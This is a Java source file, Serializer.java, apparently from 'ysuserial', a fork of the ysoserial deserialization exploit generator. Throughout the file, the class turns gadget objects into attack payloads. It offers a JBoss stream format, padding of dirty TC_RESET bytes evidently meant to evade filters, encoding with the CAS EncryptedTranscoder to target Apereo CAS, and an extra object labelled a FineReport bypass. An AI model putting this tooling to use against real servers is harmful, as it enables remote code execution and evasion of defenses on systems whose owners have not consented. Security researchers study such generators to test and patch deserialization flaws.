package org.su18.ysuserial;

import org.jasig.spring.webflow.plugin.EncryptedTranscoder;
import org.jboss.serial.io.JBossObjectOutputStream;

import java.io.*;
import java.util.HashMap;
import java.util.UUID;
import java.util.concurrent.Callable;

import static org.su18.ysuserial.payloads.config.Config.*;
import static org.su18.ysuserial.payloads.util.Reflections.getFieldValue;
import static org.su18.ysuserial.payloads.util.Reflections.getMethodAndInvoke;
import static org.su18.ysuserial.payloads.util.Utils.base64Encode;

public class Serializer implements Callable<byte[]> {

	private final Object object;

	public Serializer(Object object) {
		this.object = object;
	}

	public byte[] call() throws Exception {
		return serialize(object);
	}

	public static byte[] serialize(final Object obj) throws Exception {
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		serialize(obj, out);
		return out.toByteArray();
	}

	public static void serialize(Object obj, final OutputStream out) throws Exception {
		final ObjectOutputStream objOut;

		if (IS_JBOSS_OBJECT_INPUT_STREAM) {
			objOut = new JBossObjectOutputStream(out);
		} else if (IS_DIRTY_IN_TC_RESET) {
			objOut = new SuObjectOutputStream(out);
		} else if (IS_ENCRYPTED_TRANSCODER) {
			String              id      = UUID.randomUUID().toString();
			EncryptedTranscoder et      = new EncryptedTranscoder();
			String              payload = base64Encode(et.encode(obj));
			out.write((id + "_" + payload).getBytes());
			return;
		} else {
			objOut = new ObjectOutputStream(out);
		}

		objOut.writeObject(obj);

		if (FINE_REPORT_BYPASS) {
			objOut.writeObject(new HashMap());
		}
	}

	public static class SuObjectOutputStream extends ObjectOutputStream {

		public SuObjectOutputStream(OutputStream out) throws IOException {
			super(out);
		}

		@Override
		protected void writeStreamHeader() throws IOException {
			super.writeStreamHeader();
			try {
				// 写入
				for (int i = 0; i < DIRTY_LENGTH_IN_TC_RESET; i++) {
					getMethodAndInvoke(getFieldValue(this, "bout"), "writeByte", new Class[]{int.class}, new Object[]{TC_RESET});
				}
			} catch (Exception e) {
				throw new RuntimeException(e);
			}
		}
	}
}
